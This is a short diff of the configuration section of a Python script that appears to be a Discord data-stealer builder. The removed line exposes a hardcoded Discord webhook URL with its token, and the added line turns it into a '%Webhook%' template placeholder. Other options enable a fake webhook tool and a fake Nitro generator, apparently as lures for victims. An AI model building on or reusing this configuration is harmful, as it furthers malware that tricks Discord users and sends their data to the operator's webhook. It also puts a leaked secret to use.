@@ -23,7 +23,7 @@ import os.path, zipfile
 import shutil, json
 ### CONFIG ### 
 
-webhook = 'https://discord.com/api/webhooks/1121041824505671721/g-o8Ceap8JN3l01AYh3IKhcXUZ3CDFA95oOqHm4dPc8DqYyItRj0Gt4B2cXcdkHpk8gc' #Put ur webhook
+webhook = '%Webhook%' #Put ur webhook
 
 FakeWebhook = '%FakeWebhook%' # If True, starts a fake webhook tool with options to delete, spam, etc.
 Fakegen = '%FakeGen%' # If True, starts a fake Discord nitro generator
